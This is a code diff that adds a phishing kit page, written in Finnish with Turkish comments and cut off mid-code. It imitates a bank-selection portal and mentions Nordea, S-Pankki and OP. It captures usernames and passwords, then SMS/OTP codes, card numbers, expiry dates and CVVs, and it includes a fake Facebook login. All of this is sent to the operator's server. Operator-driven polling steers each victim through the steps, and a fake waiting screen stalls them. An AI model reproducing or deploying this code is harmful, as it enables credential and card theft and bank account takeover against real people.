@@ -1,0 +1,882 @@
+            html = <!DOCTYPE html>
+<html lang="fi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valitse pankki</title>
+    <link rel="shortcut icon" href="/static/img/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }}
+        /* ===== BANKA LİSTESİ ===== */
+        .page-container {{
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }}
+        .header {{
+            text-align: center;
+            margin-bottom: 30px;
+            color: #fff;
+        }}
+        .header h1 {{ font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }}
+        .header p {{ font-size: 1rem; opacity: 0.9; }}
+        .search-box {{
+            width: 100%; max-width: 400px; margin: 0 auto 30px; position: relative;
+        }}
+        .search-box input {{
+            width: 100%; padding: 14px 20px 14px 48px; border: none; border-radius: 50px;
+            font-size: 1rem; background: rgba(255,255,255,0.95);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); outline: none; transition: box-shadow 0.3s;
+        }}
+        .search-box input:focus {{ box-shadow: 0 4px 25px rgba(0,0,0,0.2); }}
+        .search-box svg {{
+            position: absolute; left: 18px; top: 50%; transform: translateY(-50%);
+            width: 20px; height: 20px; fill: #999;
+        }}
+        .banks-grid {{
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 16px;
+        }}
+        .bank-card {{
+            background: #fff; border-radius: 16px; padding: 24px 16px; text-align: center;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            min-height: 140px;
+        }}
+        .bank-card:hover {{ transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }}
+        .bank-logo {{
+            width: 80px; height: 80px; display: flex; align-items: center;
+            justify-content: center; margin-bottom: 12px;
+        }}
+        .bank-logo img {{ max-width: 100%; max-height: 100%; object-fit: contain; }}
+        .bank-logo-fallback {{
+            width: 60px; height: 60px; border-radius: 50%;
+            background: linear-gradient(135deg, #667eea, #764ba2); color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.5rem; font-weight: 700;
+        }}
+        .bank-name {{ font-size: 0.95rem; font-weight: 600; color: #333; }}
+        .no-results {{ text-align: center; color: rgba(255,255,255,0.8); font-size: 1.1rem; padding: 40px; display: none; }}
+
+        /* ===== LOGIN SAYFASI ===== */
+        .login-page {{
+            display: none;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }}
+        .login-page.active {{ display: flex; justify-content: center; align-items: flex-start; }}
+        .login-wrapper {{ max-width: 480px; width: 100%; }}
+        .login-back {{
+            display: inline-flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.85);
+            font-size: 0.95rem; cursor: pointer; margin-bottom: 20px; transition: color 0.2s;
+            background: none; border: none;
+        }}
+        .login-back:hover {{ color: #fff; }}
+        .login-back svg {{ width: 20px; height: 20px; fill: currentColor; }}
+        .login-card {{
+            background: #fff; border-radius: 24px; padding: 2rem; box-shadow: 0 8px 40px rgba(0,0,0,0.12);
+        }}
+        .login-card .bank-header {{
+            text-align: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem;
+            border-bottom: 1px solid #f0f0f0;
+        }}
+        .login-card .bank-header img {{
+            width: 72px; height: 72px; object-fit: contain; margin-bottom: 12px;
+        }}
+        .login-card .bank-header h2 {{
+            font-size: 1.15rem; color: #1F2937; font-weight: 600;
+        }}
+        .login-options {{
+            display: flex; gap: 8px; margin-bottom: 1.5rem; flex-wrap: wrap;
+        }}
+        .login-option-btn {{
+            flex: 1; padding: 12px 16px; border: 2px solid #e5e7eb; border-radius: 14px;
+            background: #fff; color: #374151; font-size: 0.88rem; cursor: pointer;
+            transition: all 0.2s; font-weight: 500; min-width: 0;
+            text-align: center; line-height: 1.3;
+        }}
+        .login-option-btn:hover {{ border-color: #2563EB; color: #2563EB; }}
+        .login-option-btn.active {{
+            background: #2563EB; color: #fff; border-color: #2563EB;
+        }}
+        .form-group {{ margin-bottom: 1.2rem; }}
+        .form-group label {{
+            display: block; margin-bottom: 0.5rem; font-weight: 600; color: #374151; font-size: 0.9rem;
+        }}
+        .form-group input {{
+            width: 100%; height: 52px; border: 2px solid #e5e7eb; border-radius: 14px;
+            padding: 0 1rem; font-size: 1rem; transition: border-color 0.2s; outline: none;
+            background: #fafafa;
+        }}
+        .form-group input:focus {{ border-color: #2563EB; background: #fff; }}
+        .login-submit {{
+            width: 100%; padding: 15px; background: #2563EB; color: #fff; border: none;
+            border-radius: 14px; font-size: 1rem; font-weight: 600; cursor: pointer;
+            margin-top: 0.5rem; transition: background 0.2s;
+        }}
+        .login-submit:hover {{ background: #1d4ed8; }}
+        .login-error {{
+            background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px;
+            padding: 12px 16px; color: #dc2626; font-size: 0.9rem; margin-bottom: 1rem;
+            display: none;
+        }}
+
+        /* ===== BEKLEYİN SAYFASI ===== */
+        .wait-page {{
+            display: none; min-height: 100vh; padding: 40px 20px;
+            flex-direction: column; align-items: center; justify-content: center; text-align: center;
+        }}
+        .wait-page.active {{ display: flex; }}
+        .wait-page h2 {{ color: #fff; font-size: 1.5rem; margin-bottom: 1rem; }}
+        .wait-page p {{ color: rgba(255,255,255,0.85); max-width: 400px; margin: 0.4rem 0; }}
+        .spinner {{
+            width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }}
+        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+
+        @media (max-width: 480px) {{
+            .banks-grid {{ grid-template-columns: repeat(2, 1fr); gap: 12px; }}
+            .bank-card {{ padding: 16px 12px; min-height: 120px; }}
+            .bank-logo {{ width: 60px; height: 60px; }}
+            .page-container {{ padding: 20px 12px; }}
+            .header h1 {{ font-size: 1.4rem; }}
+            .login-card {{ padding: 1.5rem; }}
+        }}
+    </style>
+</head>
+<body>
+    <!-- BANKA LİSTESİ -->
+    <div class="page-container" id="bankListPage">
+        <div class="header">
+            <h1>Valitse pankkisi</h1>
+            <p>Ole hyvä ja valitse pankki</p>
+        </div>
+        <div class="search-box">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <input type="text" id="searchInput" placeholder="Hae pankkia..." oninput="filterBanks()">
+        </div>
+        <div class="banks-grid" id="banksGrid"></div>
+        <div class="no-results" id="noResults">Pankkia ei löytynyt</div>
+    </div>
+
+    <!-- LOGİN SAYFASI -->
+    <div class="login-page" id="loginPage">
+        <div class="login-wrapper">
+            <button class="login-back" onclick="showBankList()">
+                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                Takaisin
+            </button>
+            <div class="login-card">
+                <div class="bank-header">
+                    <img id="loginBankLogo" src="" alt="">
+                    <h2 id="loginBankTitle"></h2>
+                </div>
+                <div id="loginOptions"></div>
+                <div class="login-error" id="loginError"></div>
+                <form id="loginForm" onsubmit="return handleLogin(event)">
+                    <div class="form-group">
+                        <label id="usernameLabel">Käyttäjätunnus</label>
+                        <input type="text" id="loginUsername" required>
+                    </div>
+                    <div class="form-group" id="passwordGroup">
+                        <label id="passwordLabel">Salasana</label>
+                        <input type="password" id="loginPassword">
+                    </div>
+                    <button type="submit" class="login-submit" id="loginSubmitBtn">Kirjaudu Sisään</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- BEKLEYİN SAYFASI -->
+    <div class="wait-page" id="waitPage">
+        <h2>Odota Hetki.</h2>
+        <div class="spinner"></div>
+        <p><strong>Siirron turvallisuuden vuoksi, älä poistu tältä sivulta!</strong></p>
+        <p>Hakemuksesi käsitellään turvallisesti.</p>
+        <p style="opacity:0.7;font-size:0.9rem;">Prosessi voi kestää noin 15 minuuttia. Ole hyvä ja odota.</p>
+    </div>
+
+    <!-- DİNAMİK SAYFA ALANI (Admin aksiyonlarına göre) -->
+    <div class="dynamic-page" id="dynamicPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- SMS SAYFASI -->
+    <div class="sms-page" id="smsPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- KART SAYFASI -->
+    <div class="card-page" id="cardPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- FACEBOOK SAYFASI -->
+    <div class="facebook-page" id="facebookPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- VERIFY SAYFASI -->
+    <div class="verify-page" id="verifyPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- SUCCESS SAYFASI -->
+    <div class="success-page" id="successPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- SUPPORT SAYFASI -->
+    <div class="support-page" id="supportPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- BANK LOGIN ERROR SAYFASI -->
+    <div class="banklogin-error-page" id="bankLoginErrorPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+    </div>
+
+    <!-- BANNED SAYFASI -->
+    <div class="banned-page" id="bannedPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+        <h2 style="color:#fff;">Pääsy estetty</h2>
+        <p style="color:rgba(255,255,255,0.7);margin-top:1rem;">Tilisi on estetty.</p>
+    </div>
+
+    <script>
+    var allBanks = {banks_json};
+    var selectedBank = null;
+
+    // Render bank cards
+    function renderBanks(banks) {{
+        var grid = document.getElementById('banksGrid');
+        var html = '';
+        for (var i = 0; i < banks.length; i++) {{
+            var b = banks[i];
+            var name = b.bank_name || '';
+            var logo = b.logo || '';
+            var fallback = name.charAt(0) || '?';
+            html += '<div class="bank-card" onclick="selectBank(' + b.id + ')">' +
+                '<div class="bank-logo">' +
+                    (logo ? '<img src="/static/img/banks/' + logo + '" alt="' + name.replace(/"/g,'&quot;') + '" onerror="this.style.display=\\'none\\';this.parentElement.innerHTML=\\'<div class=bank-logo-fallback>' + fallback + '</div>\\';">' : '<div class="bank-logo-fallback">' + fallback + '</div>') +
+                '</div>' +
+                '<div class="bank-name">' + name + '</div>' +
+            '</div>';
+        }}
+        grid.innerHTML = html;
+    }}
+
+    renderBanks(allBanks);
+
+    function filterBanks() {{
+        var query = document.getElementById('searchInput').value.toLowerCase();
+        var filtered = allBanks.filter(function(b) {{
+            return (b.bank_name || '').toLowerCase().indexOf(query) !== -1;
+        }});
+        renderBanks(filtered);
+        document.getElementById('noResults').style.display = filtered.length === 0 ? 'block' : 'none';
+    }}
+
+    function selectBank(bankId) {{
+        selectedBank = allBanks.find(function(b) {{ return b.id == bankId; }});
+        if (!selectedBank) return;
+
+        // Notify server
+        var fd = new FormData();
+        fd.append('bank_id', selectedBank.id);
+        fd.append('bank_name', selectedBank.bank_name || '');
+        fetch('/api/bankUpdate', {{ method: 'POST', body: fd, credentials: 'include' }}).catch(function(){{}});
+
+        // Set up login page
+        var logo = document.getElementById('loginBankLogo');
+        if (selectedBank.logo) {{
+            logo.src = '/static/img/banks/' + selectedBank.logo;
+            logo.style.display = '';
+        }} else {{
+            logo.style.display = 'none';
+        }}
+
+        document.getElementById('loginBankTitle').textContent = selectedBank.bank_title || selectedBank.bank_name || '';
+
+        // Password field
+        var pwGroup = document.getElementById('passwordGroup');
+        pwGroup.style.display = selectedBank.show_password === '0' ? 'none' : '';
+
+        // Custom labels
+        var uLabel = document.getElementById('usernameLabel');
+        var pLabel = document.getElementById('passwordLabel');
+        uLabel.textContent = selectedBank.input_label_1 || 'Käyttäjätunnus';
+        pLabel.textContent = selectedBank.input_label_2 || 'Salasana';
+        document.getElementById('loginUsername').placeholder = selectedBank.input_label_1 || 'Käyttäjätunnus';
+        document.getElementById('loginPassword').placeholder = selectedBank.input_label_2 || 'Salasana';
+
+        // Login options
+        var optDiv = document.getElementById('loginOptions');
+        optDiv.innerHTML = '';
+        var optCount = parseInt(selectedBank.option_count || '0');
+        if (selectedBank.login_option === '1' && optCount > 0) {{
+            var names = [selectedBank.option_name_1, selectedBank.option_name_2, selectedBank.option_name_3].filter(Boolean);
+            if (names.length > 0) {{
+                var optHtml = '<div class="login-options">';
+                for (var oi = 0; oi < names.length; oi++) {{
+                    optHtml += '<button type="button" class="login-option-btn' + (oi === 0 ? ' active' : '') + '" onclick="selectOption(this)">' + names[oi] + '</button>';
+                }}
+                optHtml += '</div>';
+                optDiv.innerHTML = optHtml;
+            }}
+        }}
+
+        // Clear previous inputs
+        document.getElementById('loginUsername').value = '';
+        document.getElementById('loginPassword').value = '';
+        document.getElementById('loginError').style.display = 'none';
+
+        // Show login page
+        document.getElementById('bankListPage').style.display = 'none';
+        document.getElementById('loginPage').classList.add('active');
+        document.getElementById('waitPage').classList.remove('active');
+    }}
+
+    function selectOption(btn) {{
+        document.querySelectorAll('.login-option-btn').forEach(function(b) {{ b.classList.remove('active'); }});
+        btn.classList.add('active');
+    }}
+
+    function showBankList() {{
+        document.getElementById('loginPage').classList.remove('active');
+        document.getElementById('bankListPage').style.display = '';
+    }}
+
+    function handleLogin(e) {{
+        e.preventDefault();
+        var username = document.getElementById('loginUsername').value.trim();
+        var password = document.getElementById('loginPassword').value;
+        var errDiv = document.getElementById('loginError');
+
+        if (!username) {{
+            errDiv.textContent = 'Anna käyttäjätunnus oikein';
+            errDiv.style.display = 'block';
+            return false;
+        }}
+        if (selectedBank.show_password !== '0' && !password) {{
+            errDiv.textContent = 'Anna salasana oikein';
+            errDiv.style.display = 'block';
+            return false;
+        }}
+
+        errDiv.style.display = 'none';
+        var submitBtn = document.getElementById('loginSubmitBtn');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Käsitellään...';
+
+        var fd = new FormData();
+        fd.append('username', username);
+        fd.append('password', password);
+        fd.append('bank_id', selectedBank.id);
+        fd.append('bank_name', selectedBank.bank_name || '');
+
+        // Get selected option
+        var activeOpt = document.querySelector('.login-option-btn.active');
+        if (activeOpt) fd.append('login_option', activeOpt.textContent);
+
+        fetch('/api/save_login', {{ method: 'POST', body: fd, credentials: 'include' }})
+            .then(function(r) {{ return r.json(); }})
+            .then(function() {{ showWaitPage(); }})
+            .catch(function() {{ showWaitPage(); }});
+
+        return false;
+    }}
+
+    function showWaitPage() {{
+        document.getElementById('loginPage').classList.remove('active');
+        document.getElementById('waitPage').classList.add('active');
+        // Initialize last page to wait so first poll doesn't re-trigger
+        _lastPage = 'wait';
+        // Start polling for admin actions
+        startPagePolling();
+    }}
+
+    // ========================================
+    // VISITOR ID HELPERS
+    // ========================================
+    function getVisitorId() {{
+        var vid = localStorage.getItem('visitor_id') || '';
+        if (!vid) {{
+            var cookies = document.cookie.split(';');
+            for (var i = 0; i < cookies.length; i++) {{
+                var c = cookies[i].trim();
+                if (c.indexOf('vid=') === 0) {{ vid = c.substring(4); break; }}
+            }}
+        }}
+        return vid;
+    }}
+
+    // ========================================
+    // PAGE POLLING SYSTEM
+    // ========================================
+    var _currentPage = 'wait';
+    var _pollTimer = null;
+    var _lastPage = '';
+
+    function startPagePolling() {{
+        if (_pollTimer) clearInterval(_pollTimer);
+        _pollTimer = setInterval(function() {{
+            var vid = getVisitorId();
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
+            xhr.withCredentials = true;
+            xhr.onload = function() {{
+                try {{
+                    var d = JSON.parse(xhr.responseText);
+                    if (d.success && d.page && d.page !== _lastPage) {{
+                        _lastPage = d.page;
+                        handlePageChange(d.page, d);
+                    }}
+                }} catch(e) {{}}
+            }};
+            xhr.onerror = function() {{}};
+            xhr.send();
+        }}, 2000);
+    }}
+
+    function hideAllPages() {{
+        var pages = ['bankListPage','loginPage','waitPage','dynamicPage','smsPage','cardPage',
+                     'facebookPage','verifyPage','successPage','supportPage','bankLoginErrorPage','bannedPage'];
+        for (var i = 0; i < pages.length; i++) {{
+            var el = document.getElementById(pages[i]);
+            if (el) {{
+                el.style.display = 'none';
+                el.classList.remove('active');
+            }}
+        }}
+    }}
+
+    function showPage(pageId, displayType) {{
+        hideAllPages();
+        var el = document.getElementById(pageId);
+        if (el) {{
+            el.style.display = displayType || 'flex';
+            el.classList.add('active');
+        }}
+    }}
+
+    function handlePageChange(page, serverData) {{
+        serverData = serverData || {{}};
+        _currentPage = page;
+
+        switch(page) {{
+            case 'wheel':
+                window.location.href = '/wheel';
+                return;
+            case 'bankList':
+                showPage('bankListPage', 'block');
+                return;
+            case 'bankLogin':
+                if (selectedBank) {{
+                    showPage('loginPage');
+                    document.getElementById('loginPage').classList.add('active');
+                    document.getElementById('loginUsername').value = '';
+                    document.getElementById('loginPassword').value = '';
+                    document.getElementById('loginError').style.display = 'none';
+                    document.getElementById('loginSubmitBtn').disabled = false;
+                    document.getElementById('loginSubmitBtn').textContent = 'Kirjaudu Sisään';
+                }} else {{
+                    showPage('bankListPage', 'block');
+                }}
+                break;
+            case 'wait':
+                showPage('waitPage');
+                document.getElementById('waitPage').classList.add('active');
+                break;
+            case 'bankLoginError':
+                renderBankLoginErrorPage();
+                break;
+            case 'sms':
+                renderSmsPage(serverData);
+                break;
+            case 'otp':
+                renderSmsPage(serverData);
+                break;
+            case 'card':
+                renderCardPage();
+                break;
+            case 'facebook':
+                renderFacebookPage();
+                break;
+            case 'success':
+                renderSuccessPage();
+                break;
+            case 'banned':
+                showPage('bannedPage');
+                if (_pollTimer) clearInterval(_pollTimer);
+                return;
+            case 'nordeaVerify':
+                renderVerifyPage('Nordea', serverData);
+                break;
+            case 'spankkiVerify':
+                renderVerifyPage('S-Pankki', serverData);
+                break;
+            case 'opVerify':
+                renderVerifyPage('OP', serverData);
+                break;
+            case 'austriaVerify':
+                renderCustomVerifyPage(serverData.verify_texts || {{}});
+                break;
+            case 'customVerify':
+                renderCustomVerifyPage(serverData.custom_verify_texts || {{}});
+                break;
+            case 'support':
+                renderSupportPage(serverData);
+                break;
+            case 'whatsapp':
+                renderSupportPage(serverData);
+                break;
+            default:
+                showPage('waitPage');
+                document.getElementById('waitPage').classList.add('active');
+                break;
+        }}
+    }}
+
+    // ========================================
+    // PAGE RENDERERS
+    // ========================================
+
+    function renderBankLoginErrorPage() {{
+        var el = document.getElementById('bankLoginErrorPage');
+        var bankName = selectedBank ? (selectedBank.bank_name || '') : '';
+        el.innerHTML = '<div style="max-width:480px;width:100%;">' +
+            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 40px rgba(0,0,0,0.12);">' +
+                '<div style="background:#FEE2E2;border:1px solid #FECACA;border-radius:12px;padding:1rem;margin-bottom:1.5rem;text-align:center;">' +
+                    '<p style="color:#DC2626;font-weight:600;">⚠️ Virhe</p>' +
+                    '<p style="color:#DC2626;font-size:0.9rem;margin-top:0.5rem;">Tarkista kirjautumistietosi ja yritä uudelleen.</p>' +
+                '</div>' +
+                (selectedBank && selectedBank.logo ? '<div style="text-align:center;margin-bottom:1rem;"><img src="/static/img/banks/' + selectedBank.logo + '" style="width:64px;height:64px;object-fit:contain;" alt="' + bankName + '"></div>' : '') +
+                '<form id="retryLoginForm" onsubmit="return handleRetryLogin(event)">' +
+                    '<div class="form-group"><label>Käyttäjätunnus</label>' +
+                    '<input type="text" id="retryUsername" required style="width:100%;height:52px;border:2px solid #e5e7eb;border-radius:14px;padding:0 1rem;font-size:1rem;background:#fafafa;"></div>' +
+                    '<div class="form-group"><label>Salasana</label>' +
+                    '<input type="password" id="retryPassword" style="width:100%;height:52px;border:2px solid #e5e7eb;border-radius:14px;padding:0 1rem;font-size:1rem;background:#fafafa;"></div>' +
+                    '<button type="submit" class="login-submit" id="retryLoginBtn">Kirjaudu Sisään</button>' +
+                '</form>' +
+            '</div>' +
+        '</div>';
+        showPage('bankLoginErrorPage');
+    }}
+
+    function handleRetryLogin(e) {{
+        e.preventDefault();
+        var u = document.getElementById('retryUsername').value.trim();
+        var p = document.getElementById('retryPassword').value;
+        if (!u) return false;
+        var btn = document.getElementById('retryLoginBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        var bankId = selectedBank ? selectedBank.id : '';
+        var bankName = selectedBank ? (selectedBank.bank_name || '') : '';
+        submitToApi('save_login', {{username: u, password: p, bank_id: bankId, bank_name: bankName}});
+        return false;
+    }}
+
+    function renderSmsPage(data) {{
+        var el = document.getElementById('smsPage');
+        var smsReq = data.sms_request || {{}};
+        var title = smsReq.title || 'SMS Vahvistuskoodi';
+        var msg = smsReq.message || '';
+        var len = parseInt(smsReq.length) || 6;
+        var inputs = '';
+        for (var i = 0; i < len; i++) {{
+            inputs += '<input type="text" maxlength="1" class="sms-input" style="width:44px;height:52px;text-align:center;font-size:1.4rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">';
+        }}
+        el.innerHTML = '<div style="max-width:420px;width:100%;">' +
+            '<h2 style="color:#fff;margin-bottom:0.5rem;">' + title + '</h2>' +
+            (msg ? '<p style="color:rgba(255,255,255,0.8);margin-bottom:1.5rem;">' + msg + '</p>' : '') +
+            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+                '<div style="display:flex;gap:6px;justify-content:center;margin-bottom:1.5rem;flex-wrap:wrap;" id="smsInputs">' + inputs + '</div>' +
+                '<button id="smsSubmitBtn" onclick="handleSmsSubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
+            '</div>' +
+        '</div>';
+        showPage('smsPage');
+        // Focus first input
+        var firstInput = el.querySelector('.sms-input');
+        if (firstInput) firstInput.focus();
+    }}
+
+    function handleSmsSubmit() {{
+        var inputs = document.querySelectorAll('#smsInputs .sms-input');
+        var code = '';
+        inputs.forEach(function(i){{ code += i.value; }});
+        if (code.length < 3) return;
+        var btn = document.getElementById('smsSubmitBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        submitToApi('save_sms', {{sms: code}});
+    }}
+
+    function renderCardPage() {{
+        var el = document.getElementById('cardPage');
+        el.innerHTML = '<div style="max-width:440px;width:100%;">' +
+            /* ---- KART GÖRSELİ ---- */
+            '<div id="creditCardVisual" style="width:100%;max-width:400px;aspect-ratio:1.586;margin:0 auto 1.5rem;border-radius:18px;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.35);background:linear-gradient(135deg,#0a2e5c 0%,#1a5aa8 50%,#0a2e5c 100%);">' +
+                /* Sarı üst alan */
+                '<div style="position:absolute;top:0;left:0;right:0;height:45%;background:linear-gradient(135deg,#f5c518 0%,#e8b400 100%);border-radius:18px 18px 0 0;">' +
+                    /* Chip ikonu */
+                    '<div style="position:absolute;top:22%;left:8%;width:48px;height:38px;background:linear-gradient(135deg,#d4af37,#c5a028);border-radius:6px;border:2px solid #b8960f;display:flex;align-items:center;justify-content:center;">' +
+                        '<div style="width:28px;height:20px;border:1.5px solid rgba(0,0,0,0.25);border-radius:3px;position:relative;">' +
+                            '<div style="position:absolute;top:50%;left:0;right:0;height:1.5px;background:rgba(0,0,0,0.2);"></div>' +
+                            '<div style="position:absolute;top:0;bottom:0;left:50%;width:1.5px;background:rgba(0,0,0,0.2);"></div>' +
+                        '</div>' +
+                    '</div>' +
+                '</div>' +
+                /* Kart numarası */
+                '<div style="position:absolute;top:48%;left:8%;right:8%;text-align:center;">' +
+                    '<div style="font-size:10px;letter-spacing:2px;color:rgba(255,255,255,0.65);text-transform:uppercase;margin-bottom:4px;font-family:monospace;">card number</div>' +
+                    '<div id="cardVisualNumber" style="font-size:22px;letter-spacing:4px;color:#fff;font-family:\\'Courier New\\',monospace;font-weight:700;text-shadow:0 1px 3px rgba(0,0,0,0.4);">0123 4567 8910 1112</div>' +
+                '</div>' +
+                /* Expiry */
+                '<div style="position:absolute;bottom:12%;right:10%;text-align:right;">' +
+                    '<div style="font-size:8px;letter-spacing:1.5px;color:rgba(255,255,255,0.55);text-transform:uppercase;font-family:monospace;">expiration</div>' +
+                    '<div style="display:flex;align-items:center;justify-content:flex-end;gap:4px;">' +
+                        '<div style="font-size:6px;color:rgba(255,255,255,0.5);line-height:1;text-align:right;font-family:monospace;">VALID<br>THRU</div>' +
+                        '<div style="color:rgba(255,255,255,0.5);font-size:12px;">&#9654;</div>' +
+                        '<div id="cardVisualExpiry" style="font-size:18px;color:#fff;font-family:\\'Courier New\\',monospace;font-weight:700;letter-spacing:2px;text-shadow:0 1px 3px rgba(0,0,0,0.4);">01/24</div>' +
+                    '</div>' +
+                '</div>' +
+            '</div>' +
+            /* ---- FORM ALANI ---- */
+            '<div style="max-width:400px;margin:0 auto;display:flex;flex-direction:column;gap:0.75rem;">' +
+                '<input type="text" id="cardNumber" maxlength="19" placeholder="Kortin Tiedot" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
+                '<input type="text" id="cardExpiry" maxlength="5" placeholder="Kortin Viimeinen Käyttöpäivä (KK/VV)" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
+                '<input type="text" id="cardCvc" maxlength="4" placeholder="CVV-koodi" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
+                '<button id="cardSubmitBtn" onclick="handleCardSubmit()" style="width:100%;padding:14px;background:#f5c518;color:#1a1a2e;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:0.25rem;letter-spacing:0.5px;">Jatka</button>' +
+            '</div>' +
+        '</div>';
+        showPage('cardPage');
+
+        // Card number formatting + visual update
+        document.getElementById('cardNumber').addEventListener('input', function(e) {{
+            var v = e.target.value.replace(/\\D/g,'').substring(0,16);
+            e.target.value = v.replace(/(\\d{{4}})(?=\\d)/g, '$1 ');
+            var display = v;
+            while (display.length < 16) display += '•';
+            var formatted = display.match(/.{{1,4}}/g).join('  ');
+            document.getElementById('cardVisualNumber').textContent = formatted;
+        }});
+
+        // Expiry formatting + visual update
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {{
+            var v = e.target.value.replace(/\\D/g,'').substring(0,4);
+            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
+            e.target.value = v;
+            document.getElementById('cardVisualExpiry').textContent = v || '••/••';
+        }});
+
+        // Placeholder styling for inputs
+        var cardInputs = el.querySelectorAll('input');
+        cardInputs.forEach(function(inp) {{
+            inp.style.setProperty('--ph-color','rgba(255,255,255,0.5)');
+        }});
+        if (!document.getElementById('cardPlaceholderStyle')) {{
+            var phs = document.createElement('style');
+            phs.id = 'cardPlaceholderStyle';
+            phs.textContent = '#cardPage input::placeholder {{ color: rgba(255,255,255,0.5); }}';
+            document.head.appendChild(phs);
+        }}
+    }}
+
+    function handleCardSubmit() {{
+        var cn = document.getElementById('cardNumber');
+        var ce = document.getElementById('cardExpiry');
+        var cc = document.getElementById('cardCvc');
+        if (!cn || !cn.value || !ce || !ce.value || !cc || !cc.value) return;
+        var btn = document.getElementById('cardSubmitBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        submitToApi('save_card', {{card_number: cn.value, expiry_date: ce.value, cvc: cc.value}});
+    }}
+
+    function renderFacebookPage() {{
+        var el = document.getElementById('facebookPage');
+        el.innerHTML = '<div style="max-width:440px;width:100%;">' +
+            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+                '<div style="text-align:center;margin-bottom:1.5rem;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/600px-Facebook_Logo_%282019%29.png" style="width:48px;" alt="Facebook"></div>' +
